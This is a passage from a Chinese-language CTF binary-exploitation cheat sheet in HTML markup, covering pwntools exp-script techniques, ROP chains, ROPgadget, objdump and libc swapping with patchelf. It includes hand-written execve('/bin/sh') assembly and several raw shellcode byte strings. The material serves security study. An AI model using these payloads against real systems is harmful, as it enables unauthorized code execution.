punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果 <code>exp.py</code> 可以 PWN 通，会显示 <code>[*] Switching to interactive mode</code>，并且可以进入 shell 正常使用终端命令</p><p><strong>如果显示 <code>[*] Got EOF while reading in interactive</code> ，则说明 PWN 失败了</strong></p></blockquote><hr><h2 id="exp-编写技巧"><a href="#exp-编写技巧" class="headerlink" title="exp 编写技巧"></a>exp 编写技巧</h2><h3 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h3><blockquote><p>获取 elf 文件中某个已知函数名的函数地址</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr 为程序 test 中函数 "callsystem" 的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="获取字符串地址"><a href="#获取字符串地址" class="headerlink" title="获取字符串地址"></a>获取字符串地址</h3><blockquote><p>获取 elf 文件中字符串的地址</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>bin_sh_addr <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># bin_sh_addr 为程序 test 中字符串 "/bin/sh" 所在地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>python3 里字符串前面必须加上 <code>b&#39;xxx&#39;</code>，否则找的是 str 对象，而不是字节数据</p></blockquote><hr><h3 id="接收程序输出的地址"><a href="#接收程序输出的地址" class="headerlink" title="接收程序输出的地址"></a>接收程序输出的地址</h3><blockquote><p>获取程序的输出信息，并将其转换为十六进制数据（获取函数的真实地址）</p></blockquote><p>直接获取一行的输出内容：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'But there is gift for you :\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 屏幕输出信息</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 接收直到 \n 为止的输出内容，并将其转换为十六进制 int 型，最后赋值给 addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以指定获取的内容长度：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 32 位程序：接收输出内容的 2 ~ 9 位（从 0 开始），并将其转换为十六进制 int 型，最后赋值给 addr</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 64 位程序：接收输出内容的 2 ~ 13 位（从 0 开始），并将其转换为十六进制 int 型，最后赋值给 addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>根据程序架构，32 位地址长度为 4 字节，64 位地址长度为 8 字节，也可以直接根据长度获取地址：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 32 位程序的地址</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 64 位程序的地址</span>addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 32 位程序的地址</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 64 位程序的地址</span>addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 32 位程序的地址</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 64 位程序的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意，<strong>函数的地址也可以在 IDA 中直接看到</strong>，但是<mark>如果程序开启了 PIE（地址随机化），即：每次输出到屏幕的地址信息不一样，则不能采取直接查看 IDA 中的地址并进行赋值，只能使用从屏幕获取程序输出数据的方法</mark></p></blockquote><hr><h3 id="附加-gdb-调试"><a href="#附加-gdb-调试" class="headerlink" title="附加 gdb 调试"></a>附加 gdb 调试</h3><blockquote><p>在 exp 中启动 gdb 调试二进制程序</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>   <span class="token comment"># 使用 gdb 调试二进制程序的进程 io</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 暂停执行后续的 exp 代码, 按任意键继续, 便于调试</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以通过 <code>io.process()</code> 启动程序进程后，观察进程 <code>pid</code>，然后手动通过 <code>gdb attach pid</code> 来调试进程</p><blockquote><p>这两条指令需要一起使用，<code>gdb.attach(io)</code> 之后必须加上 <code>pause()</code> ，否则启动 gdb 后 exp 脚本还会继续往下执行，并不会停在 <code>gdb.attach(io)</code> 的地方</p><p><em>一般可以在发送 payload 之前 pause()，这样 gdb 调试时内存中还没有我们发送的数据，等我们分析完后，按任意键让 python 脚本继续执行发送 payload，就又可以分析发送 payload 后的程序了，方便我们观察 payload 对程序的影响</em></p></blockquote><p>为方便使用，编写成 <code>debug()</code> 调试函数如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="执行-C-语言函数"><a href="#执行-C-语言函数" class="headerlink" title="执行 C 语言函数"></a>执行 C 语言函数</h3><blockquote><p>使 Python 编写的 exp 脚本可以执行 C 语言的函数</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>   <span class="token comment"># 导入 ctypes 库使 Python 可以执行 C 语言的函数</span>lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>   <span class="token comment"># 导入 C 运行库</span><span class="token comment"># ------------------------------------</span><span class="token comment"># 以 C 语言随机数为例：</span>lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment"># 设置随机数种子</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span>   <span class="token comment"># 执行随机函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="指定程序的-libc"><a href="#指定程序的-libc" class="headerlink" title="指定程序的 libc"></a>指定程序的 libc</h3><p>在 exp 中指定二进制程序的 libc</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'替换的新ld(可选)'</span><span class="token punctuation">,</span> <span class="token string">'二进制程序'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span> <span class="token string">'替换的新libc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>一个程序启动需要用到 ld.so 和 libc.so 文件，调用哪个 ld.so 和 libc.so 在程序中是指明的</strong></p><p><em>如果使用的 ld.so 和 libc.so 版本不匹配，直接调用 <code>LD_PRELOAD</code> 会使程序崩溃</em></p><p>因此，在使用特定版本的 libc 的时候，还要替换掉对应的 ld.so</p></blockquote><hr><h3 id="随机输入数据测试溢出"><a href="#随机输入数据测试溢出" class="headerlink" title="随机输入数据测试溢出"></a>随机输入数据测试溢出</h3><p>生成 200 个随机字符序列：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> cyclic <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将随机字符序列输入程序后，报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">*EIP 0x62616164 <span class="token punctuation">(</span><span class="token string">'daab'</span><span class="token punctuation">)</span>Invalid address 0x62616164<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说明输入的随机字符数列导致程序溢出，覆盖了返回地址，EIP 在地址 0x62616164 处</p><p>计算覆盖返回地址所需的输入偏移量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> cyclic <span class="token parameter variable">-l</span> 0x62616164<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 <code>p</code>、<code>distance</code> 也可以达到同样效果 （假设两个地址为 address1 和 address 2）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p address1-address2<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> distance address1 address2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="获取-shell-的方式"><a href="#获取-shell-的方式" class="headerlink" title="获取 shell 的方式"></a>获取 shell 的方式</h2><p>获取 shell 常用的三种方式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system<span class="token punctuation">(</span><span class="token string">"/bin/sh<span class="token entity" title="\x00">\x00</span>"</span><span class="token punctuation">)</span>system<span class="token punctuation">(</span><span class="token string">"sh<span class="token entity" title="\x00">\x00</span>"</span><span class="token punctuation">)</span>system<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$0</span><span class="token entity" title="\x00">\x00</span>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h1><h2 id="连接程序和端口"><a href="#连接程序和端口" class="headerlink" title="连接程序和端口"></a>连接程序和端口</h2><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io &#x3D; porcess(“本地文件路径”)</td><td>本地连接</td></tr><tr><td>io &#x3D; remote(“ip 地址”, 端口)</td><td>远程连接</td></tr><tr><td>io.close()</td><td>关闭连接</td></tr></tbody></table><hr><h2 id="发送-payload"><a href="#发送-payload" class="headerlink" title="发送 payload"></a>发送 payload</h2><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.sendafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload</td></tr><tr><td>io.sendlineafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload，并进行换行（末尾 \n）</td></tr><tr><td>io.send(payload)</td><td>发送 payload</td></tr><tr><td>io.sendline(payload)</td><td>发送 payload，并进行换行（末尾 \n）</td></tr></tbody></table><hr><h2 id="接收返回内容"><a href="#接收返回内容" class="headerlink" title="接收返回内容"></a>接收返回内容</h2><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.recv(N)</td><td>接收 N 个字符</td></tr><tr><td>io.recvline()</td><td>直接接收一整行的输出</td></tr><tr><td>io.recvlines(N)</td><td>接收 N 个行的输出</td></tr><tr><td>io.recvuntil(some_string)</td><td>接收到 some_string 为止</td></tr><tr><td>io.recvuntil(“\n”, drop&#x3D;True)</td><td>接收到 “\n” 为止，并且丢弃 “\n”</td></tr><tr><td>int(io.recv(10), 16)</td><td>接收返回内容，长度是10，以将其转换为十六进制的数值</td></tr><tr><td>int(io.recv()[2:14], 16)</td><td>接收返回内容的第 2 ~ 14 位（从 0 开始），并将其转换为十六进制的数值</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.interactive()</td><td>直接进行交互，相当于回到 shell 的模式，一般在取得 shell 之后使用</td></tr></tbody></table><hr><h2 id="ELF-文件操作"><a href="#ELF-文件操作" class="headerlink" title="ELF 文件操作"></a>ELF 文件操作</h2><blockquote><p><strong>首先需要 <code>elf = ELF(&quot;本地文件路径&quot;)</code> 创建一个对象</strong></p></blockquote><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>elf.symbols[“function”]</td><td>找到 function 的地址</td></tr><tr><td>elf.got[“function”]</td><td>找到 function 的 got</td></tr><tr><td>elf.plt[“function”]</td><td>找到 function 的 plt</td></tr><tr><td>next(elf.search(b’some_characters’))</td><td>找到包含 some_characters 的内容，可以是字符串、汇编代码或某个数值的地址</td></tr><tr><td>elf.bss())</td><td>找到 bss 段地址</td></tr></tbody></table><hr><h2 id="ROP-链"><a href="#ROP-链" class="headerlink" title="ROP 链"></a>ROP 链</h2><blockquote><p><strong>首先需要 <code>rop = ROP(&quot;本地文件路径&quot;)</code> 创建一个对象</strong></p></blockquote><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>rop.raw(‘a’ * 32)</td><td>在构造的 rop 链里面写32个 a</td></tr><tr><td>rop.call(‘read’ , (0 , elf.bss(0x80)))</td><td>调用一个函数，可以简写成：<code>rop.read(0,elf.bss(0x80))</code></td></tr><tr><td>rop.chain()</td><td>就是整个 rop 链，发送的 payload</td></tr><tr><td>rop.dump()</td><td>直观地展示当前的 rop 链</td></tr><tr><td>rop.migrate(base_stage)</td><td>将程序流程转移到 base_stage（地址）</td></tr><tr><td>rop.unresolve(value)</td><td>给出一个地址，反解析出符号</td></tr><tr><td>rop.search(regs&#x3D;[‘ecx’ , ‘ebx’])</td><td>搜索对 eax 进行操作的 gadget</td></tr><tr><td>rop.find_gadget([‘pop eax’ , ‘ret’])</td><td>搜索 <code>pop eax ret</code> 这样的 gadget</td></tr></tbody></table><hr><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><blockquote><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些能够获取到 shell 的 code 就是 shellcode</p><p>在漏洞利用过程时，我们将编制好的 shellcode 通过有问题的程序写入到内存中，然后执行它</p><p>shellcode 对应的 C 语言代码一般为：<code>system(&quot;/bin/sh&quot;)</code></p></blockquote><h2 id="生成默认-shellcode"><a href="#生成默认-shellcode" class="headerlink" title="生成默认 shellcode"></a>生成默认 shellcode</h2><ol><li><p>方法一：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造 shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>方法二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造 64 位 shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><blockquote><p><strong>这段代码有一个缺点，就是生成的 shellcode 比较长，在某些可写入空间比较小的情况下不能很好的使用</strong><br><strong>通常生成的 64 位 shellcode 长度为 0x30，32 位 shellcode 长度为 0x2c</strong></p></blockquote><hr><h2 id="手动编写-shellcode"><a href="#手动编写-shellcode" class="headerlink" title="手动编写 shellcode"></a>手动编写 shellcode</h2><h3 id="shellcode-原理"><a href="#shellcode-原理" class="headerlink" title="shellcode 原理"></a>shellcode 原理</h3><ol><li><p>在 linux 中，存在一系列的系统调用，这些系统调用都通过 <code>syscall</code> 指令来触发，并且通过 <code>rax</code> 寄存器作为系统调用号来区分不同的系统调用，可以查看 linux 下的 <code>arch/x86/entry/syscall_64.tbl</code> 获得对应的系统调用号。比如，<code>execve</code>（执行程序函数，类似于 Python 中的<code>os.system</code> 函数，可以调用其他程序的执行）对应的的系统调用号为 59</p></li><li><p>接着，通过 <code>rdi</code> 和 <code>rsi</code> 两个寄存器传入参数。其中，<code>rdi</code> 是指向运行程序的路径的指针，<code>rsi</code> 为一个指向 0 的指针，<code>rdx</code> 为 0</p></li><li><p>也就是说，整个过程应该完成：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax <span class="token operator">=</span> <span class="token number">59</span>rdi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token char">'/bin/sh'</span><span class="token punctuation">]</span>rsi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>rdx <span class="token operator">=</span> <span class="token number">0</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>对应的汇编代码：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor rdx<span class="token punctuation">,</span>rdxpush rdxmov rsi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">0x68732f2f6e69622f</span>  <span class="token comment">// 0x68732f2f6e69622f 就是 '/bin/sh', 这里因为64位数据不能直接push，所以用了rax寄存器来传递</span>push raxmov rdi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="手动编译-shellcode-使用"><a href="#手动编译-shellcode-使用" class="headerlink" title="手动编译 shellcode 使用"></a>手动编译 shellcode 使用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdx,rdx;push rdx;mov rsi,rsp;mov rax,0x68732f2f6e69622f;push rax;mov rdi,rsp;mov rax,59;syscall;'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token comment"># b'H1\xd2RH\x89\xe6H\xb8/bin//shPH\x89\xe7H\xc7\xc0;\x00\x00\x00\x0f\x05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>这样生成的 shellcode 就只有 0x1E，一般这种大小就足够了</strong></p></blockquote><hr><h2 id="其他可用-shellcode"><a href="#其他可用-shellcode" class="headerlink" title="其他可用 shellcode"></a>其他可用 shellcode</h2><blockquote><p>以下两种 shellcode 长度都是 0x1E，共 30 个字节</p><p>此外，可以在此网站查阅更多版本的 shellcode：<br><a href="http://shell-storm.org/shellcode/index.html">Shellcodes database for study cases (shell-storm.org)</a></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>以下 shellcode 长度为 0x17，共 23 字节</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><hr><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><blockquote><p>栈溢出中 ROP 用来寻找 gadget 的利器，ROPgadget 安装 pwntools 时自带，无需另外安装</p></blockquote><ol><li>查找 <code>pop</code> 和 <code>ret</code> 相关的 gadget 片段</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> 二进制程序 <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仅查找 <code>eax、ebx</code> 相关的 gadget 片段：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> 二进制程序 <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'eax'</span>ROPgadget <span class="token parameter variable">--binary</span> 二进制程序 <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'ebx'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>仅查找 <code>ret</code> 指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> 文件名 <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>查找 <code>/bin/sh</code> 字符串</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> 二进制程序 <span class="token parameter variable">--string</span> <span class="token string">"/bin/sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>查找系统调用 <code>syscall</code>（64 位）和 <code>int 0x80</code>（32 位）的地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> 文件名 <span class="token parameter variable">--only</span> <span class="token string">'syscall'</span>ROPgadget <span class="token parameter variable">--binary</span> 文件名 <span class="token parameter variable">--only</span> <span class="token string">'int'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h1><blockquote><p>objdump 是 Linux 下的反汇编工具，同时也是一个非常强大的二进制文件分析工具</p><p><strong>基本已弃用，可以用 IDA 代替</strong></p></blockquote><ol><li>反汇编应用程序</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-M</span> intel <span class="token parameter variable">-d</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加上 <code>-M intel</code> 参数指定汇编代码为 intel 风格（默认为 <code>AT&amp;T</code>）</p><ol start="2"><li>显示文件的头信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-f</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>显示文件的段信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-h</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>显示文件的符号表</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-t</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>显示指定 section 的完整内容，默认所有的非空 section 都会被显示</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-s</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="glibc-all-in-one-和-patchelf"><a href="#glibc-all-in-one-和-patchelf" class="headerlink" title="glibc-all-in-one 和 patchelf"></a>glibc-all-in-one 和 patchelf</h1><blockquote><p>ELF 文件在生成之后会把动态链接器和 libc 写死到 ELF 文件中，因此只要把 ld 改掉就可以将 ELF 文件链接到其他的 libc，进而加载不同的 libc</p></blockquote><ol><li>使用 <code>glibc-all-in-one</code> 和 <code>patchelf</code> 修改二进制程序的 GLIBC 版本</li></ol><p>更新 glibc 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/glibc-all-in-one<span class="token function">sudo</span> ./update_list   <span class="token comment"># 更新 glibc</span><span class="token function">cat</span> list   <span class="token comment"># 查看各 Ubuntu 版本的 glibc</span><span class="token function">sudo</span> ./download <span class="token number">2.27</span>-3ubuntu1_amd64   <span class="token comment"># 下载所需的 glibc 版本, 以 2.27-3ubuntu1_amd64 为例</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认下载到 glibc-all-in-one 的 <code>/libs</code> 目录下</p><p>然后复制其中的 ld 文件和 libc 文件到 PWN 题程序目录中（可选，只是复制到 PWN 题程序目录中， ld 文件和 libc 文件的路径更简单，方便一点而已）</p><p>以 glibc-all-in-one 中下载的 <code>2.27-3ubuntu1_amd64</code> 下的 <code>ld-2.27.so</code> 和 <code>libc-2.27.so</code> 为例</p><p>为了简化 libc 所在路径，可以生成符号链接（可选）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span 